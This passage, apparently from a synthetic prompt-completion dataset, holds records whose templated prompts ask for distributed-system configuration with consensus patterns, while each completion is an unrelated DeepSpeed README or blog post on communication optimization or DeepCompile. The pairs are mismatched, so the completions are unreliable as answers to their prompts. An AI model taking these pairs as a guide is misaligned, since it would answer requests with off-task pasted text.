Brings Efficient Training for Large-scale Transformers. [arXiv:2211.11586](https://arxiv.org/abs/2211.11586).\n16. Conglong Li, Zhewei Yao, Xiaoxia Wu, Minjia Zhang, Yuxiong He. (2022) DeepSpeed Data Efficiency: Improving Deep Learning Model Quality and Training Efficiency via Efficient Data Sampling and Routing. [arXiv:2212.03597](https://arxiv.org/abs/2212.03597) [ENLSP2023 Workshop at NeurIPS2023](https://neurips2023-enlsp.github.io/)\n17. Xiaoxia Wu, Cheng Li, Reza Yazdani Aminabadi, Zhewei Yao, Yuxiong He. (2023) Understanding INT4 Quantization for Transformer Models: Latency Speedup, Composability, and Failure Cases. [arXiv:2301.12017](https://arxiv.org/abs/2301.12017) and [ICML2023](https://icml.cc/Conferences/2023).\n18. Syed Zawad, Cheng Li, Zhewei Yao, Elton Zheng, Yuxiong He, Feng Yan. (2023) DySR: Adaptive Super-Resolution via Algorithm and System Co-design. [ICLR:2023](https://openreview.net/forum?id=Pgtn4l6eKjv).\n19. Sheng Shen, Zhewei Yao, Chunyuan Li, Trevor Darrell, Kurt Keutzer, Yuxiong He. (2023) Scaling Vision-Language Models with Sparse Mixture of Experts. [arXiv:2303.07226](https://arxiv.org/abs/2303.07226) and [Finding at EMNLP2023](https://2023.emnlp.org/).\n20. Quentin Anthony, Ammar Ahmad Awan, Jeff Rasley, Yuxiong He, Aamir Shafi, Mustafa Abduljabbar, Hari Subramoni, Dhabaleswar Panda. (2023) MCR-DL: Mix-and-Match Communication Runtime for Deep Learning [arXiv:2303.08374](https://arxiv.org/abs/2303.08374) and will appear at IPDPS 2023.\n21. Siddharth Singh, Olatunji Ruwase, Ammar Ahmad Awan, Samyam Rajbhandari, Yuxiong He, Abhinav Bhatele. (2023) A Hybrid Tensor-Expert-Data Parallelism Approach to Optimize Mixture-of-Experts Training [arXiv:2303.06318](https://arxiv.org/abs/2303.06318) and [ICS 2023](https://dl.acm.org/doi/10.1145/3577193.3593704).\n22. Guanhua Wang, Heyang Qin, Sam Ade Jacobs, Xiaoxia Wu, Connor Holmes, Zhewei Yao, Samyam Rajbhandari, Olatunji Ruwase, Feng Yan, Lei Yang, Yuxiong He. (2023) ZeRO++: Extremely Efficient Collective Communication for Giant Model Training [arXiv:2306.10209](https://arxiv.org/abs/2306.10209) and [ML for Sys Workshop at NeurIPS2023](http://mlforsystems.org/) [[blog]](https://www.microsoft.com/en-us/research/blog/deepspeed-zero-a-leap-in-speed-for-llm-and-chat-model-training-with-4x-less-communication/)\n23. Zhewei Yao, Xiaoxia Wu, Cheng Li, Stephen Youn, Yuxiong He. (2023) ZeroQuant-V2: Exploring Post-training Quantization in LLMs from Comprehensive Study to Low Rank Compensation [arXiv:2303.08302](https://arxiv.org/abs/2303.08302) and [ENLSP2023 Workshop at NeurIPS2023](https://neurips2023-enlsp.github.io/) [[slides]](docs/assets/files/zeroquant_series.pdf)\n24. Pareesa Ameneh Golnari, Zhewei Yao, Yuxiong He. (2023) Selective Guidance: Are All the Denoising Steps of Guided Diffusion Important? [arXiv:2305.09847](https://arxiv.org/abs/2305.09847)\n25. Zhewei Yao, Reza Yazdani Aminabadi, Olatunji Ruwase, Samyam Rajbhandari, Xiaoxia Wu, Ammar Ahmad Awan, Jeff Rasley, Minjia Zhang, Conglong Li, Connor Holmes, Zhongzhu Zhou, Michael Wyatt, Molly Smith, Lev Kurilenko, Heyang Qin, Masahiro Tanaka, Shuai Che, Shuaiwen Leon Song, Yuxiong He. (2023) DeepSpeed-Chat: Easy, Fast and Affordable RLHF Training of ChatGPT-like Models at All Scales [arXiv:2308.01320](https://arxiv.org/abs/2308.01320).\n26. Xiaoxia Wu, Zhewei Yao, Yuxiong He. (2023) ZeroQuant-FP: A Leap Forward in LLMs Post-Training W4A8 Quantization Using Floating-Point Formats [arXiv:2307.09782](https://arxiv.org/abs/2307.09782) and [ENLSP2023 Workshop at NeurIPS2023](https://neurips2023-enlsp.github.io/) [[slides]](docs/assets/files/zeroquant_series.pdf)\n27. Zhewei Yao, Xiaoxia Wu, Conglong Li, Minjia Zhang, Heyang Qin, Olatunji Ruwase, Ammar Ahmad Awan, Samyam Rajbhandari, Yuxiong He. (2023) DeepSpeed-VisualChat: Multi-Round Multi-Image Interleave Chat via Multi-Modal Causal Attention [arXiv:2309.14327](https://arxiv.org/pdf/2309.14327.pdf)\n28. Shuaiwen Leon Song, Bonnie Kruft, Minjia Zhang, Conglong Li, Shiyang Chen, Chengming Zhang, Masahiro Tanaka, Xiaoxia Wu, Jeff Rasley, Ammar Ahmad Awan, Connor Holmes, Martin Cai, Adam Ghanem, Zhongzhu Zhou, Yuxiong He, et al. (2023) DeepSpeed4Science Initiative: Enabling Large-Scale Scientific Discovery through Sophisticated AI System Technologies [arXiv:2310.04610](https://arxiv.org/abs/2310.04610) [[blog]](https://www.microsoft.com/en-us/research/blog/announcing-the-deepspeed4science-initiative-enabling-large-scale-scientific-discovery-through-sophisticated-ai-system-technologies/)\n29. Zhewei Yao, Reza Yazdani Aminabadi, Stephen Youn, Xiaoxia Wu, Elton Zheng, Yuxiong He. (2023) ZeroQuant-HERO: Hardware-Enhanced Robust Optimized Post-Training Quantization Framework for W8A8 Transformers [arXiv:2310.17723](https://arxiv.org/abs/2310.17723)\n\n30. Xiaoxia Wu, Haojun Xia, Stephen Youn, Zhen Zheng, Shiyang Chen, Arash Bakhtiari, Michael Wyatt, Reza Yazdani Aminabadi, Yuxiong He, Olatunji Ruwase, Leon Song, Zhewei Yao (2023) ZeroQuant(4+2): Redefining LLMs Quantization with a New FP6-Centric Strategy for Diverse Generative Tasks [arXiv:2312.08583](https://arxiv.org/abs/2312.08583)\n\n31. Haojun Xia, Zhen Zheng, Xiaoxia Wu, Shiyang Chen, Zhewei Yao, Stephen Youn, Arash Bakhtiari, Michael Wyatt, Donglin Zhuang, Zhongzhu Zhou, Olatunji Ruwase, Yuxiong He, Shuaiwen Leon Song. (2024) FP6-LLM: Efficiently Serving Large Language Models Through FP6-Centric Algorithm-System Co-Design  [arXiv:2401.14112](https://arxiv.org/abs/2401.14112)\n32. Sam Ade Jacobs, Masahiro Tanaka, Chengming Zhang, Minjia Zhang, Reza Yazdani Aminadabi, Shuaiwen Leon Song, Samyam Rajbhandari, Yuxiong He. (2024) [System Optimizations for Enabling Training of Extreme Long Sequence Transformer Models](https://dl.acm.org/doi/10.1145/3662158.3662806)\n33. Xinyu Lian, Sam Ade Jacobs, Lev Kurilenko, Masahiro Tanaka, Stas Bekman, Olatunji Ruwase, Minjia Zhang. (2024) Universal Checkpointing: Efficient and Flexible Checkpointing for Large Scale Distributed Training [arXiv:2406.18820](https://arxiv.org/abs/2406.18820)\n34. Stas Bekman, Samyam Rajbhandari, Michael Wyatt, Jeff Rasley, Tunji Ruwase, Zhewei Yao, Aurick Qiao, Yuxiong He. (2025) Arctic Long Sequence Training: Scalable And Efficient Training For Multi-Million Token Sequences [arXiv:2506.13996](https://arxiv.org/abs/2506.13996)\n\n\n# Videos\n1. DeepSpeed KDD 2020 Tutorial\n    1. [Overview](https://www.youtube.com/watch?v=CaseqC45DNc&list=PLa85ZdUjfWS21mgibJ2vCvLziprjpKoW0&index=29)\n    2. [ZeRO + large model training](https://www.youtube.com/watch?v=y4_bCiAsIAk&list=PLa85ZdUjfWS21mgibJ2vCvLziprjpKoW0&index=28)\n    3. [17B T-NLG demo](https://www.youtube.com/watch?v=9V-ZbP92drg&list=PLa85ZdUjfWS21mgibJ2vCvLziprjpKoW0&index=27)\n    4. [Fastest BERT training + RScan tuning](https://www.youtube.com/watch?v=o1K-ZG9F6u0&list=PLa85ZdUjfWS21mgibJ2vCvLziprjpKoW0&index=26)\n    5. DeepSpeed hands on deep dive: [part 1](https://www.youtube.com/watch?v=_NOk-mBwDYg&list=PLa85ZdUjfWS21mgibJ2vCvLziprjpKoW0&index=92), [part 2](https://www.youtube.com/watch?v=sG6_c4VXLww&list=PLa85ZdUjfWS21mgibJ2vCvLziprjpKoW0&index=94), [part 3](https://www.youtube.com/watch?v=k9yPkBTayos&list=PLa85ZdUjfWS21mgibJ2vCvLziprjpKoW0&index=93)\n    6. [FAQ](https://www.youtube.com/watch?v=nsHu6vEgPew&list=PLa85ZdUjfWS21mgibJ2vCvLziprjpKoW0&index=24)\n2. Microsoft Research Webinar\n    * Registration is free and all videos are available on-demand.\n    * [ZeRO & Fastest BERT: Increasing the scale and speed of deep learning training in DeepSpeed](https://note.microsoft.com/MSR-Webinar-DeepSpeed-Registration-On-Demand.html).\n3. [DeepSpeed on AzureML](https://youtu.be/yBVXR8G8Bg8)\n4. [Large Model Training and Inference with DeepSpeed // Samyam Rajbhandari // LLMs in Prod Conference](https://www.youtube.com/watch?v=cntxC3g22oU) [[slides]](docs/assets/files/presentation-mlops.pdf)\n5. Community Tutorials\n    * [DeepSpeed: All the tricks to scale to gigantic models (Mark Saroufim)](https://www.youtube.com/watch?v=pDGI668pNg0)\n    * [Turing-NLG, DeepSpeed and the ZeRO optimizer (Yannic Kilcher)](https://www.youtube.com/watch?v=tC01FRB0M7w)\n    * [Ultimate Guide To Scaling ML Models (The AI Epiphany)](https://www.youtube.com/watch?v=hc0u4avAkuM)\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "README.md", "language": "markdown", "complexity": "complex", "star_count": 39501, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 294}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<div align=\"center\">\n\n# Communication Optimizations for Large-Scale Training\n\n</div>\n\n\n## Table of Contents\n1. [Introduction](#introduction)\n2. [Gradient AllReduce Optimization for ZeRO stages 1 and 2](#ar-opt)\n3. [Optimizing Parameter All-Gather for ZeRO2 Training](#ag-opt)\n4. [Optimizing AlltoAll for Sequence-Parallel Training](#sp-opt)\n\n\n## 1. Introduction <a name=\"introduction\"></a>\nTraining LLMs on large datasets can be extremely costly both in terms of hardware resources and time. An important step to minimize such costs is to carefully combine an appropriate number of resources together with a scalable library that guarantees training completion within a time limit. In this post, we discuss a key aspect of the scalability features of DeepSpeed, the communication optimization. Communication collectives (e.g., all-reduce, all-gather, etc.) are critical pieces of many popular DeepSpeed technologies (e.g., ZeRO, MoE, AutoTP, etc.), and in the following sections we discuss our new optimizations of some of these collectives. These optimizations are available in DeepSpeed versions >= 0.x.x.\n\n## 2. Gradient AllReduce Optimization for ZeRO stages 1 and 2 <a name=\"ar-opt\"></a>\n\nBefore diving into this optimization, let's take a step back and show some of the case studies that demonstrate the need.\n\nAllReduce operation is an important part of the training process. In ZeRO, we handle this in buckets, which can be configured to get good communication throughput. As the number of GPUs increases, we encounter smaller-partition AllReduces. In this case, the current bucketing scheme cannot help with the communication overhead. This mostly becomes an issue when training smaller-scale models (like Llama-7B) with large number of GPUs.\n\nFor instance, when training a dense-7B architecture with Zero stages 1 or 2, we encounter a 1 and 2 second increase for the AllReduce time by increasing from 256 to 512 and 1024 A100 GPUs. This issue mostly arises from the fact that, the gradient-averaging happens with smaller partitions (#parameters / #GPUs) per-GPU rank. This issue gets more serious when training MoE architectures (3 - 12 second) for which the expert's parameters can be farther away due to the current parallelism layout of data and expert parallelism.\n\nIn this section, we introduce two main optimization techniques for alleviating these communication bottleneck.\n\nFirst, Multi-rank bucketing for the same process group: for this optimization, we simply pack all data that requires to be reduced from different ranks into one big flattened tensor and call AllReduce instead of reduce operations. After the reduction, we scatter the right portion of data to the corresponding ranks.\n\nSecond, add new layout for the expert-data parallelism: the default parallelism layout for MoE architecture (as shown in Fig 1) is planned in a way that the experts are placed first on E parallel GPUs and replicated D times (data-parallel). With this layout, we encounter slower AllReduce as data-parallel ranks are placed farther away especially when we have cross-rank communication. We call this layout E + D.\n\n<div align=\"center\">\n  <img src=\"assets/images/e+d.png\" alt=\"\" width=800 /><br>\n\n  *Fig 1: Different MoE parallel layout. left) E + D, which places the GPUs in EP dimension first before adding DP, right) D + E, that replicates each expert by DP size, before constructing EP. We get faster AllReduce for the second layout while increasing the AlltoAll time. It potentially results in faster e2e training time, as the communication volume for AllReduce (total parameter size) is normally much more than AlltoAll (MLP activation memory).*<br>\n</div>\nBy changing this layout from E + D to D + E (shown in Fig 1), where we first replicate each expert by D times and then add them across expert-parallel dimension, we can reduce the AllReduce time substantially. On an A100-DGX cluster, where each node has 8 GPUs, we see about 8x reduction in cross-node infiniband communication-volume for the parameter update process, which are now processed faster using the intra-node NVLinks. Note that by adding this optimization, we increase the cost of AlltoAll happening for the MoE part of the model, however, we have seen that the performance benefit of AllReduce overweighs this cost.\n\nTable 1 summarizes the saving observed for training a 7B dense and a MoE architecture by using the optimized AllReduce scheme. After applying the multi-rank bucketing technique, we reduce the AllReduce time by 4x for dense architecture and 5x - 8x for the MoE one. In addition, we obtain an extra 3x saving using the new D + E layout for the MoE architecture. Therefore, we see higher performance gain on MoE architectures when using large number of GPUs. For instance, when training a 7B-base MoE architecture, we reduce iteration-time from 13 sec to 9.5 sec on 512 GPUs (37%) and from 16.1 sec to 5.1 sec on 1k-GPU setup (3.2x).\n<div align=\"center\">\n\n|  | GPUs | AllReduce time | Iteration time |\n|----------|:------:|:------:|:------:|\nbaseline (dense)\t| 1024|\t1.2 | 5.4\noptimized (dense)\t| 1024|\t0.36 | 4.5\nbaseline (MoE)\t| 1024 |\t11.5 | 16.1\noptimized (MoE)\t| 1024\t| 0.45 | 5.1\n\nTable 1. AllReduce saving observed for both dense and MoE architectures.\n\n</div>\n\n## 3. Optimizing Parameter All-Gather for ZeRO2 Training <a name=\"ag-opt\"></a>\n\nThe same as with AllReduce, all-gather takes longer as we have more partitions. As the parameters are stored in a flattened buffer for ZeRO stage-2, we can simply have a one call to all-gather the parameters into this tensor.\n\nWhen all-gathering the updated parameters at Zero-Stage2, the bucketing scheme uses several narrow operations and creates a list of tensors with the bucket size from each partition. We needed this scheme to align with the `all_gather` operation from PyTorch.\nHowever, by adding the support for the `all_gather_into_tensor`, operation that has been added to the newer versions of PyTorch, we can simply have a kernel call to do the full-parameter all-gather. With this optimization, we see about 2x reduction in the step time for large-scale training.\n\n## 4. Optimizing AlltoAll for Sequence-Parallel Training <a name=\"sp-opt\"></a>\n\nFor this part of the optimization, we add some fusion for the communication that is required for the DeepSpeed-Ulysses to provide a more scalable approach for when we increase the SP from 2 to 8 (for this study, we consider A100-DGX hardware, which has 8 GPUs per-node and by increasing the parallelism more than 8, we encounter performance-hit by the cross-node communication).\n\nThese fusions are done at two levels:\n1. Fuse the sequence AlltoAll for q,k, and v: we Scatter the heads using the mixed tensor rather than splitting them beforehand. For this part, we need to get some more information from the modeling side (such as the number of q and kv heads), to split the heads before calling AlltoAll. We have added some new changes on the Megatron-DeepSpeed repo that incorporate these changes for the sequence-parallelism.\n2. Fuse the AlltoAll tensors and call the PyTorch's AlltoAll-single API: we reshape the tensors for the scatter dimension and use a single tensor for AlltoAll which alleviates the overhead of using a list of tensors which requires a contiguous call for each element of the list.\n\nBy adding these optimizations, we see about 10 to 15% speedup compared to the previous design, and obtain good scalability across different SP-degree and context-lengths. In the following table, we show the improvement achieved by using SP, when doubling the GPU-count and increasing the SP-degree. We obtain over 80% of efficiency when increasing from 256 to 512 GPUs using SP-2. Furthermore, by increasing the sequence-length and SP, while keeping the processed tokens similar, we achieve over 75% of efficiency for 2x more resources. On the other hand, if we can double the number of tokens (shown on the last row of table 2), we can improve the performance to 1.81x.\n\n<div align=\"center\">\n\n| GPUs | bsz | seq | Tokens (M) | SP | Sample (4K)-per-second | Speedup (x) |\n|----------|:------:|:------:|:------:|:------:|:------:|:------:|\n256\t| 256|\t8192\t|2|1\t| 60.71\t |1\n512\t| 256|\t8192\t|2|2\t| 111.18 |\t1.83\n512\t| 128|\t16384 |2|4 | 108.81 |\t1.79\n512\t| 64\t|32768\t|2|8\t| 106.54 |\t1.75\n512\t| 64\t|65536\t|4|8\t| 110.05 |\t1.81\n\nTable 2. Sequence-Parallelism scalability using DeepSpeed-Ulysses.\n\n</div>\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/comm-opt/README.md", "language": "markdown", "complexity": "simple", "star_count": 39501, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 83}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<div align=\"center\">\n\n# DeepCompile: Unlocking Compiler Optimization for Distributed Training\n\n</div>\n\n# Introduction\n\n<div align=\"center\">\n\n<img src=\"media/perf_summary.png\" width=\"1000\">\n\n</div>\n\nDistributed training has become essential for scaling today’s massive deep learning models. While deep learning compilers like PyTorch compiler dramatically improved single-GPU training performance through optimizations like kernel fusion and operator scheduling, they fall short when it comes to distributed workloads.\nExisting distributed training frameworks such as DeepSpeed and FSDP have made large-scale model training feasible through advanced parallelization strategies. While powerful, their optimizations are implemented at the PyTorch framework level, which limits the ability to apply compiler-style techniques like dependency analysis or operator scheduling.\n\nDeepCompile addresses this gap by enabling compiler-level optimizations for distributed training. It takes a standard single-GPU model implementation and transforms it into an optimized multi-GPU training graph without requiring changes to the model code. Unlike existing approaches, DeepCompile automatically applies parameter sharding, communication scheduling, and memory-aware execution at the compiler IR level, enabling global analysis and optimization that are difficult to express in traditional frameworks. Furthermore, during training, DeepCompile employs profile-guided optimization techniques to dynamically tune these parallelization strategies and improve training performance.\n\nOur evaluation demonstrates that DeepCompile improves training performance over ZeRO-3 baselines, achieving up to 1.5x speedup when sufficient GPU resources are available, and up to 7x speedup in GPU-constrained settings that require offloading. DeepCompile is available in DeepSpeed versions >= [0.16.6](https://github.com/deepspeedai/DeepSpeed/releases/tag/v0.16.6). As it is under active development, we recommend using the latest version of DeepSpeed or installing from source to access the most recent updates and bug fixes.\n\n# Design Overview\n\nDeepCompile extends the capabilities of deep learning compilers to support distributed training. It starts from a standard single-GPU model implementation, such as those available on the Hugging Face model hub, and automatically transforms it by inserting necessary distributed training operations such as parameter sharding and communication primitives. Users are not required to embed any distributed logic into the model code.\n\nThe process begins by compiling the model into an intermediate representation (IR), which forms a computation graph. DeepCompile then applies a sequence of *optimization passes*, each responsible for a specific transformation of the computation graph or a targeted performance improvement, to incrementally introduce distributed behavior and optimize the graph. These include operations such as all-gather for sharded parameters or offloading of optimizer states, all while preserving the original computation semantics (Fig. 1).\n\n<div align=\"center\">\n\n<img src=\"media/workflow.png\" width=\"400\">\n\n*Figure 1: Workflow of compilation and optimization with DeepCompile.*\n\n</div>\n\nAt its core, DeepCompile builds on two key capabilities:\n\n- **Automatic parallelization**: DeepCompile allows optimization passes to rewrite the single-GPU computation graph into a distributed multi-GPU version, incorporating strategies such as ZeRO, FSDP, and more. This eliminates the need for manual implementation of distributed training logic, drastically reducing engineering effort.\n- **Profile-guided performance tuning**: At runtime, DeepCompile collects profiling data such as operator-level memory usage and execution latency. It uses this information to dynamically schedule computation and communication operators. This enables effects such as an improved overlap between communication and computation, and an avoidance of memory bottlenecks. Fine-grained tuning through these optimization passes often leads to better performance than even manually engineered implementations.\n\nFigure 2 illustrates the optimization cycle employed by DeepCompile. After the initial computation graph is generated by the compiler, DeepCompile profiles its behavior by measuring operator execution time, communication overhead, and memory usage throughout the forward and backward passes.\n\n<div align=\"center\">\n\n<img src=\"media/opt_loop.png\" width=\"600\">\n\n*Figure 2. Optimization cycle.*\n\n</div>\n\nBased on the collected profiling data, DeepCompile applies a sequence of optimization passes. These passes modify the computation graph by inserting, removing, or reordering operators to improve overall efficiency. The modified graph is then re-profiled, and this cycle of profiling and optimization is repeated.\n\nOnce a stable set of optimizations has been applied, the graph is deployed for the remaining training iterations. During execution, memory usage and other runtime characteristics may change. In such cases, DeepCompile can resume the profiling and optimization cycle according to the predefined schedule of passes, allowing the graph to adapt and maintain high performance.\n\n# Optimizations\n\nDeepCompile is designed as a general compiler framework for applying and optimizing a wide range of parallelization strategies. In the following, we describe several optimizations that have been implemented as optimization passes within DeepCompile.\n\n## ZeRO3\n\nAs an initial step, we have used DeepCompile to implement and enhance ZeRO-3-style optimizations at the compiler level. ZeRO-3 partitions model parameters, gradients, and optimizer states across devices, reducing memory usage and enabling large-scale training.\n\nIn conventional ZeRO-3 implementations, operations such as all-gather, reduce-scatter, and buffer release are typically inserted using Python hooks at runtime. DeepCompile replaces this approach by injecting these operations directly into the computation graph during compilation. This allows the compiler to determine their placement precisely, guided by both the static structure of the graph and runtime profiling information.\n\nOne of the key optimizations is **proactive prefetching**, which launches all-gather operations earlier in the computation based on memory usage profiling. This reordering increases the overlap between communication and computation thereby improving throughput, while avoiding OOMs. In addition, small communication operations are often fused to reduce launch latency and improve efficiency.\n\nAnother optimization is **selective unsharding**, which keeps certain parameters in an unsharded form during the forward and backward passes when memory conditions permit. This reduces the frequency of all-gather operations and avoids redundant communication, particularly in scenarios where gradient accumulation is enabled.\n\n## Offloading\n\nDeepCompile also supports **adaptive offloading**, which offloads optimizer states to reduce GPU memory pressure. Unlike approaches that offload all the optimizer states, adaptive offloading identifies only the portions that exceed the memory limit—such as momentum and variance used by the Adam optimizer—and schedules data transfers to overlap with computation. This selective and asynchronous strategy minimizes overhead and enables efficient training even in memory-constrained environments.\n\n## ZeRO1\n\nZeRO-1 differs from ZeRO-3 in that it shards only the optimizer states across devices, while keeping parameters and gradients fully replicated. This approach reduces memory usage with minimal changes to computation flow, making it a lightweight alternative for certain training scenarios.\nDeepCompile implements ZeRO-1-style optimization by inserting reduce-scatter operations directly into the computation graph. By avoiding Python-level hooks, this graph-level integration reduces overhead and improves execution efficiency.\n\n# Performance Improvements\n\n## ZeRO-3\n\nWe evaluated DeepCompile on Llama-3-70B and Mixtral 8x7B using parameter sharding on top of Hugging Face model implementations.\nFigure 3 shows training throughput (TFLOPs/GPU) across different gradient accumulation steps, using 32 H100 GPUs with a sequence length of 1024.\nWe compare DeepCompile against two DeepSpeed ZeRO-3 baselines: (i) an eager-mode version without compiler support (labelled ZeRO3+Eager), and (ii) a compiled version using PyTorch compiler (labelled ZeRO3+Compile). For DeepCompile, we enabled both proactive prefetching and selective unsharding to demonstrate the combined effect of these optimization passes.\n\n<div align=\"center\"> <img src=\"media/perf_zero3.png\" width=\"800\">\n\n*Figure 3. Achieved throughputs for ZeRO3 training of Llama-3 70B and Mixtral 8x7B models.*\n\n</div>\nAcross both models, DeepCompile consistently delivers higher throughput. The benefit becomes more pronounced at higher accumulation steps, where the reduced frequency of parameter updates makes selective unsharding more effective. DeepCompile with proactive prefetching and selective unsharding achieves up to 1.28× speedup over ZeRO-3 on Llama-3-70B and 1.54× on Mixtral 8x7B.\n\nMeanwhile, enabling the PyTorch compiler with ZeRO-3, i.e., ZeRO3+Compile introduces minor overheads in some settings. This is because ZeRO-3 includes many conditional branches for runtime features such as prefetching. When the compiler encounters branches that cannot be statically resolved, it splits the computation into multiple graph segments. These fragmented segments can reduce optimization opportunities and introduce additional overheads during execution.\n\n## Offloading\n\nTraining models as large as Llama-3 70B with ZeRO-3 typically requires 32 GPUs with 80GB of memory.\nDeepSpeed addresses this challenge by offering offloading capabilities, which transfer optimizer states and optionally model parameters to CPU memory to reduce GPU memory usage. DeepCompile also supports offloading through a dedicated optimization pass, but with a few key differences in design.\n\nUnlike the traditional approach of offloading both optimizer computation and memory, DeepCompile offloads only optimizer memory (e.g., momentum, variance, and master weights of Adam optimizer) while the optimizer computation remains on GPU. DeepCompile profiles memory usage during both forward and backward passes to identify when offloading is necessary, and transfers only the required data. This fine-grained approach avoids unnecessary overhead and helps maintain high computational throughput.\nFurthermore, DeepCompile overlaps data transfers with computation whenever possible, dynamically adjusting the timing based on observed memory usage patterns. This asynchronous behavior is a crucial aspect of DeepCompile’s offloading strategy, allowing it to reduce GPU memory pressure without stalling execution.\n\nWe evaluated DeepCompile's offloading using Llama-3 70B on 16xH100-80GB (half the required GPU counts) and present the results in Figure 4.\n\n<div align=\"center\">\n\n<img src=\"media/perf_offload.png\" width=\"400\">\n\n*Figure 4. Achieved throughput of optimizer offloading for Llama-3 70B on 16x80GB GPUs*\n\n</div>\n\nWe compare against two ZeRO-3 offloading baselines: (i) an eager-mode version without compiler support (ZeRO3+Eager), and (ii) a compiled version using PyTorch compiler (ZeRO3+Compile). As shown by the results, DeepCompile significantly improves offloading efficiency and provides up to 7× speedup over ZeRO3+Eager. In contrast, we see that ZeRO3+Compile achieves similar performance as ZeRO3+Eager.\n\n\n## ZeRO-1\n\nWe also evaluated DeepCompile with ZeRO-1 using the Llama-3-8B model. We compare DeepCompile against two ZeRO-1 baselines: (i) an eager-mode version without compiler support (ZeRO1+Eager), and (ii) a compiled version using PyTorch compiler (ZeRO1+Compile). In our experiment with 8 GPUs and a batch size of 2, DeepCompile achieved consistent throughput improvements across different sequence lengths, as shown in Figure 5.\n\n<div align=\"center\">\n\n<img src=\"media/perf_zero1.png\" width=\"800\">\n\n*Figure 5. Achieved throughput of ZeRO-1 training of Llama-3 8B*\n\n</div>\n\nThe most significant speedup was observed with batch size 1 and sequence length 512, where DeepCompile outperformed ZeRO1+Eager by up to 1.9×, and ZeRO1+Compile by up to 2.5×.\n\nWhile compiler-based approaches can be effective for large batch sizes and long sequences by replacing suboptimal operations with more efficient kernels, they may also introduce overheads in ZeRO-1-style training in the form of *graph breaks* around the communication operations. These overheads become more pronounced with smaller batch sizes and sequence lengths, thus hurting performance compared to the non-compiled execution. In contrast, DeepCompile inserts communication operators directly into the computation graph during compilation, avoiding graph fragmentation and minimizing associated overhead. This makes DeepCompile more robust to small-scale workloads, while still benefiting from compiler-level optimizations.\n\n## Additional Results and Analysis\n\nPlease refer to our [arXiv paper](https://arxiv.org/abs/2504.09983) for additional results, such as detailed comparisons across different batch sizes, sequence lengths, and memory usage.\n\n# Looking Ahead\n\nDeepCompile brings the power of compiler-based optimizations to distributed deep learning. By transforming computation graphs and applying profile-guided optimization passes, it enables more efficient training without requiring changes to model code.\n\nThis release is just the beginning. We’re actively working on expanding the set of optimization passes and improving integration with a broader range of distributed training strategies. Future directions include automated parallelization (sequence/tensor parallelisms), smarter memory management, and dynamic adaptation to runtime behavior.\n\nWe invite the community to try DeepCompile, explore its capabilities, and contribute to its evolution. Let’s build the next generation of scalable deep learning together.\n\n# Acknowledgments\n\nWe would like to thank everyone who supported this project.\n\nThis project would not have been possible without the PyTorch Compiler—a platform that is not only powerful and flexible, but also a pleasure to work with. We are especially grateful to the developers and researchers behind PyTorch Compiler for making such an excellent foundation available to the community.\n\n# Contributors\n\nThis project is the result of a close collaboration between Microsoft and the University of Virginia. The contributors are: Masahiro Tanaka, Du Li, and Umesh Chand, Olatunji Ruwase (Microsoft); and Ali Zafar and Haiying Shen (University of Virginia).\n\n# Appendix\n\n## Examples and Benchmarks\n\nOur DeepSpeedExamples repository provides [example code](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/benchmarks/deepcompile) to enable DeepCompile.\n\n## Optimization Passes\n\nThe following optimization passes are currently available in DeepCompile:\n\n- All-gather & reduce-scatter insertion (ZeRO3)\n- Proactive prefetching (ZeRO3)\n- Selective unsharding (ZeRO3)\n- Reduce-scatter insertion (ZeRO1)\n- Adaptive offloading\n\nWe used the following combinations of passes in the experiments presented above:\n\n- Improved communication scheduling for ZeRO-3: All-gather & reduce-scatter → Proactive prefetching → Selective unsharding\n- Offloading optimizer states for ZeRO3: Adding all-gather & reduce-scatter → Adaptive offloading\n- Reduced overhead and improved overlap for ZeRO-1: Adding reduce-scatter\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepcompile/README.md", "language": "markdown", "complexity": "medium", "star_count": 39501, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 175}, "authority_level": "high", "authentic": true}}
